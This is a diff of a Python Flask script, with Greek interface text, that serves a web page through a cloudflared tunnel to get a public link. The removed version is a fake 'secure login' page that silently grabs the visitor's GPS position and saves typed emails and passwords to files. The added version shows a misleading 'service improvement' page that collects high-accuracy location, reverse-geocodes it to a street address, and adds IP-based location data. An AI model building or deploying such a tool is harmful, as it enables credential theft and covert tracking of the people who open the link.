@@ -1,209 +1,217 @@
-# Login Page Location.py
-
 import os
+import sys
 import json
 import subprocess
-import sys
 import re
 import logging
-from threading import Thread
 import time
+from threading import Thread
 from datetime import datetime
-from flask import Flask, render_template_string, request, jsonify
 
-# --- Dependency and Tunnel Setup ---
+# --- Έλεγχος Εξαρτήσεων και Σύνδεσης ---
 
 def install_package(package):
-    """Installs a package using pip quietly."""
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
+    """Εγκαθιστά ένα πακέτο με pip."""
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
+    except subprocess.CalledProcessError as e:
+        print(f"[ΣΦΑΛΜΑ] Αποτυχία εγκατάστασης {package}: {e}", file=sys.stderr)
+        sys.exit(1)
 
 def check_dependencies():
-    """Checks for cloudflared and required Python packages."""
+    """Ελέγχει αν υπάρχει το cloudflared και τα απαραίτητα Python πακέτα."""
     try:
         subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except (subprocess.CalledProcessError, FileNotFoundError):
-        print("[ERROR] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματός σας.", file=sys.stderr)
-        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
+        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH.", file=sys.stderr)
+        print("Κατέβασε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
         sys.exit(1)
+    
     packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
     for pkg_name, import_name in packages.items():
         try:
             __import__(import_name)
         except ImportError:
-            print(f"Εγκατάσταση του πακέτου που λείπει: {pkg_name}...", file=sys.stderr)
             install_package(pkg_name)
 
-def run_cloudflared_and_print_link(port, script_name):
-    """Starts a cloudflared tunnel and prints the public link."""
+def run_cloudflared_and_print_link(port):
+    """Ξεκινά cloudflared tunnel και εμφανίζει μόνο το δημόσιο link."""
     cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
     process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     for line in iter(process.stdout.readline, ''):
         match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
         if match:
-            print(f"Δημόσια Σύνδεση {script_name}: {match.group(0)}")
+            print(f"\nΔημόσιος Σύνδεσμος: {match.group(0)}\n")
             sys.stdout.flush()
             break
     process.wait()
 
-
-# --- Flask Application ---
-
+# --- Εισαγωγές μετά τον έλεγχο εξαρτήσεων ---
+from flask import Flask, render_template_string, request, jsonify
 import requests
 from geopy.geocoders import Nominatim
 
-app = Flask(__name__)
+# --- ΡΥΘΜΙΣΕΙΣ ---
 
-LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/LocationData')
+LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/Τοποθεσίες')
 os.makedirs(LOCATION_FOLDER, exist_ok=True)
-geolocator = Nominatim(user_agent="location_capture_app")
+
+logger = logging.getLogger(__name__)
+logger.setLevel(logging.ERROR)  # Κρύβουμε τα INFO logs
+
+# --- Συναρτήσεις Επεξεργασίας ---
+
+geolocator = Nominatim(user_agent="fast_location_app")
+
+def process_and_save_location(data):
+    """Επεξεργάζεται στο background και αποθηκεύει δεδομένα τοποθεσίας."""
+    try:
+        lat, lon = data['latitude'], data['longitude']
+        full_data = {'gps_data': data}
+
+        # 1. Αντιστοίχιση Συντεταγμένων σε Διεύθυνση
+        try:
+            location = geolocator.reverse((lat, lon), language='el', exactly_one=True, timeout=10)
+            if location and hasattr(location, 'raw') and 'address' in location.raw:
+                full_data['address_details'] = location.raw.get('address', {})
+                full_data['full_address'] = location.address
+        except Exception:
+            full_data['full_address'] = "Μη διαθέσιμη"
+
+        # 2. Καταστήματα κοντά
+        full_data['nearby_stores'] = get_nearby_stores(lat, lon)
+
+        # 3. Τοποθεσία βάσει IP
+        full_data['ip_based_location'] = get_ip_info()
+
+        # 4. Αποθήκευση σε JSON
+        date_str = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+        filename = os.path.join(LOCATION_FOLDER, f'τοποθεσία_{date_str}.json')
+        with open(filename, 'w') as f:
+            json.dump(full_data, f, indent=4)
+
+        # Εμφάνιση μόνο του αρχείου
+        print(f"Αποθηκεύτηκαν δεδομένα στο αρχείο: {filename}\n")
+
+    except Exception as e:
+        logger.error(f"Σφάλμα στην επεξεργασία: {e}")
+
+def get_ip_info():
+    try:
+        response = requests.get("http://ipinfo.io/json", timeout=5)
+        response.raise_for_status()
+        return response.json()
+    except requests.RequestException:
+        return {}
 
 def get_nearby_stores(latitude, longitude, radius=2000):
     overpass_query = f"""[out:json];(node["shop"](around:{radius},{latitude},{longitude});way["shop"](around:{radius},{latitude},{longitude}););out body;"""
     try:
-        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query})
-        return [element['tags']['name'] for element in response.json().get('elements', []) if 'tags' in element and 'name' in element['tags']]
-    except Exception:
+        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
+        response.raise_for_status()
+        elements = response.json().get('elements', [])
+        return [element['tags']['name'] for element in elements if 'tags' in element and 'name' in element['tags']]
+    except requests.RequestException:
         return []
 
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
+# --- ΕΦΑΡΜΟΓΗ FLASK ---
+
+app = Flask(__name__)
+
+HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="el">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ασφαλής Πρόσβαση</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <style>
-        :root {
-            --bg-color: #f0f2f5; --form-bg-color: #ffffff; --text-color: #1c1e21;
-            --subtle-text-color: #606770; --border-color: #dddfe2; --button-bg-color: #0d6efd;
-            --button-hover-bg-color: #0b5ed7;
-        }
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --bg-color: #121212; --form-bg-color: #1e1e1e; --text-color: #e4e6eb;
-                --subtle-text-color: #b0b3b8; --border-color: #444; --button-bg-color: #2374e1;
-                --button-hover-bg-color: #3982e4;
-            }
-            input { color-scheme: dark; }
-        }
-        body {
-            margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-color);
-            color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; text-align: center;
-        }
-        .main-container { width: 100%; max-width: 400px; }
-        .logo-container { margin-bottom: 24px; }
-        .logo-container svg { width: 48px; height: 48px; fill: var(--button-bg-color); }
-        .login-form {
-            background: var(--form-bg-color); padding: 32px; border-radius: 12px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08); border: 1px solid var(--border-color);
-        }
-        h1 { margin: 0 0 12px 0; font-size: 28px; font-weight: 600; }
-        p { color: var(--subtle-text-color); font-size: 16px; margin: 0 0 28px 0; line-height: 1.5; }
-        input[type="email"], input[type="password"] {
-            width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid var(--border-color);
-            background-color: var(--bg-color); color: var(--text-color); border-radius: 8px; font-size: 16px; box-sizing: border-box;
-        }
-        input::placeholder { color: var(--subtle-text-color); }
-        input[type="submit"] {
-            width: 100%; padding: 14px; background-color: var(--button-bg-color); border: none;
-            border-radius: 8px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease;
-        }
-        input[type="submit"]:hover { background-color: var(--button-hover-bg-color); }
-        footer { margin-top: 32px; font-size: 13px; color: var(--subtle-text-color); }
-        footer a { color: var(--subtle-text-color); text-decoration: none; margin: 0 8px; }
-        footer a:hover { text-decoration: underline; }
-    </style>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Πρόσβαση Τοποθεσίας</title>
+<style>
+    body{margin:0;padding:20px;background-color:#121212;color:#E0E0E0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center}
+    .container{max-width:600px}h1{color:#0d6efd;font-size:2.5rem;margin-bottom:1rem}
+    p{margin-bottom:2rem;font-size:1.1rem;line-height:1.6;color:#b0b3b8}
+    button{padding:15px 30px;background-color:#0d6efd;color:white;border:none;border-radius:8px;cursor:pointer;font-size:1.2rem;font-weight:600;transition:background-color .2s ease,transform .2s ease;box-shadow:0 4px 15px rgba(13,110,253,.4)}
+    button:hover{background-color:#0b5ed7;transform:translateY(-2px)}
+    button:disabled{background-color:#555;cursor:not-allowed;transform:none;box-shadow:none}
+    #status{margin-top:1.5rem;font-size:1rem;height:20px;transition:color .3s ease}
+</style>
 </head>
 <body>
-    <div class="main-container">
-        <header class="logo-container">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
-        </header>
-        <main class="login-form">
-            <form action="/submit_credentials" method="post">
-                <h1>Καλώς ήρθατε πίσω</h1>
-                <p>Για να παρέχουμε τοπικές υπηρεσίες και να ενισχύσουμε την ασφάλεια του λογαριασμού σας, παρακαλούμε επιτρέψτε την πρόσβαση στην τοποθεσία σας.</p>
-                <input type="email" name="email" placeholder="Εισάγετε το email σας" required>
-                <input type="password" name="password" placeholder="Εισάγετε τον κωδικό πρόσβασής σας" required>
-                <input type="submit" value="Σύνδεση με Ασφάλεια">
-            </form>
-        </main>
-        <footer>
-            <a href="#">Όροι Χρήσης</a> &bull; <a href="#">Πολιτική Απορρήτου</a> &bull; <a href="#">Υποστήριξη</a>
-        </footer>
-    </div>
-    <script>
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    $.ajax({
-                        url: '/upload_location', type: 'POST',
-                        data: JSON.stringify({ 
-                            latitude: pos.coords.latitude, 
-                            longitude: pos.coords.longitude, 
-                            accuracy: pos.coords.accuracy 
-                        }),
-                        contentType: 'application/json; charset=utf-8'
-                    });
-                }, () => {}, {enableHighAccuracy: true});
-            }
+<div class="container">
+    <h1>Βελτίωση Υπηρεσίας</h1>
+    <p>Για καλύτερη εμπειρία και τοπικό περιεχόμενο, η εφαρμογή χρειάζεται πρόσβαση στην τοποθεσία σας.</p>
+    <button id="locationButton" onclick="requestLocation()">Μοιράσου την Τοποθεσία</button>
+    <div id="status"></div>
+</div>
+<script>
+    const statusEl = document.getElementById('status');
+    const buttonEl = document.getElementById('locationButton');
+    async function sendLocationToServer(position) {
+        const locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude,
+            speed: position.coords.speed,
+            heading: position.coords.heading
+        };
+        fetch('/save_location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(locationData)
+        });
+    }
+    async function requestLocation() {
+        buttonEl.disabled = true;
+        statusEl.style.color = '#ffc107';
+        statusEl.textContent = 'Γίνεται αίτημα για τοποθεσία...';
+        if (!navigator.geolocation) {
+            statusEl.style.color = '#dc3545';
+            statusEl.textContent = 'Η γεωεντοπισμός δεν υποστηρίζεται.';
+            return;
         }
-        requestLocation();
-    </script>
+        navigator.geolocation.getCurrentPosition(
+            (fastPosition) => {
+                statusEl.style.color = '#28a745';
+                statusEl.textContent = 'Η τοποθεσία λήφθηκε. Βελτίωση ακρίβειας...';
+                sendLocationToServer(fastPosition);
+                navigator.geolocation.getCurrentPosition(
+                    (accuratePosition) => {
+                        statusEl.textContent = 'Η ακρίβεια βελτιώθηκε!';
+                        sendLocationToServer(accuratePosition);
+                        buttonEl.disabled = false;
+                    },
+                    () => {
+                        statusEl.textContent = 'Η αρχική τοποθεσία αποθηκεύτηκε.';
+                        buttonEl.disabled = false;
+                    },
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+                );
+            },
+            (err) => {
+                statusEl.style.color = '#dc3545';
+                statusEl.textContent = `Σφάλμα: ${err.message}`;
+                buttonEl.disabled = false;
+            },
+            { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
+        );
+    }
+</script>
 </body>
-</html>
-'''
+</html>"""
 
-@app.route('/submit_credentials', methods=['POST'])
-def submit_credentials():
-    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
-    credentials_file = os.path.join(LOCATION_FOLDER, f"credentials_{date_str}.txt")
-    with open(credentials_file, 'w') as f:
-        f.write(f"Email: {request.form.get('email')}\nPassword: {request.form.get('password')}\n")
-    return "Η σύνδεση ήταν επιτυχής. Θα ανακατευθυνθείτε σε λίγο.", 200
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
 
-@app.route('/upload_location', methods=['POST'])
-def upload_location():
-    try:
-        data = request.get_json(force=True)
-        lat, lon = data.get('latitude'), data.get('longitude')
-        if not lat or not lon:
-            return jsonify({"error": "Μη έγκυρες συντεταγμένες"}), 400
+@app.route('/save_location', methods=['POST'])
+def save_location():
+    data = request.get_json(force=True)
+    if not data or 'latitude' not in data:
+        return jsonify({"error": "Μη έγκυρα δεδομένα τοποθεσίας."}), 400
 
-        # Get the most detailed location data possible from Nominatim
-        location = geolocator.reverse((lat, lon), language='el', exactly_one=True, timeout=10)
-        
-        # **FIX:** Extract all available address details from the raw data
-        if location and hasattr(location, 'raw') and 'address' in location.raw:
-            address_details = location.raw.get('address', {})
-            data['full_address'] = location.address
-            data['address_details'] = {
-                'house_number': address_details.get('house_number'),
-                'road': address_details.get('road'),
-                'neighbourhood': address_details.get('neighbourhood'),
-                'suburb': address_details.get('suburb'),
-                'city_district': address_details.get('city_district'),
-                'city': address_details.get('city'),
-                'county': address_details.get('county'),
-                'state': address_details.get('state'),
-                'postcode': address_details.get('postcode'),
-                'country': address_details.get('country'),
-                'country_code': address_details.get('country_code')
-            }
-        else:
-             data['full_address'] = 'N/A'
-             data['address_details'] = {}
+    processing_thread = Thread(target=process_and_save_location, args=(data,))
+    processing_thread.daemon = True
+    processing_thread.start()
+    return jsonify({"message": "Τα δεδομένα τοποθεσίας ελήφθησαν."}), 202
 
-        data['nearby_stores'] = get_nearby_stores(lat, lon)
-        date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
-        with open(os.path.join(LOCATION_FOLDER, f'location_{date_str}.json'), 'w') as f:
-            json.dump(data, f, indent=4)
-        
-        return jsonify({"message": "Τα δεδομένα τοποθεσίας αποθηκεύτηκαν"}), 200
-    except Exception as e:
-        return jsonify({"error": str(e)}), 400
+# --- ΚΥΡΙΑ ΕΚΤΕΛΕΣΗ ---
 
 if __name__ == '__main__':
     check_dependencies()
@@ -211,13 +219,15 @@ if __name__ == '__main__':
     log.setLevel(logging.ERROR)
     sys.modules['flask.cli'].show_server_banner = lambda *x: None
     port = 4040
-    script_name = "Σελίδα Σύνδεσης (Τοποθεσία)"
     flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
     flask_thread.daemon = True
     flask_thread.start()
     time.sleep(1)
     try:
-        run_cloudflared_and_print_link(port, script_name)
+        run_cloudflared_and_print_link(port)
     except KeyboardInterrupt:
         print("\nΤερματισμός...")
         sys.exit(0)
+    except Exception as e:
+        print(f"\nΠαρουσιάστηκε σφάλμα: {e}")
+        sys.exit(1)
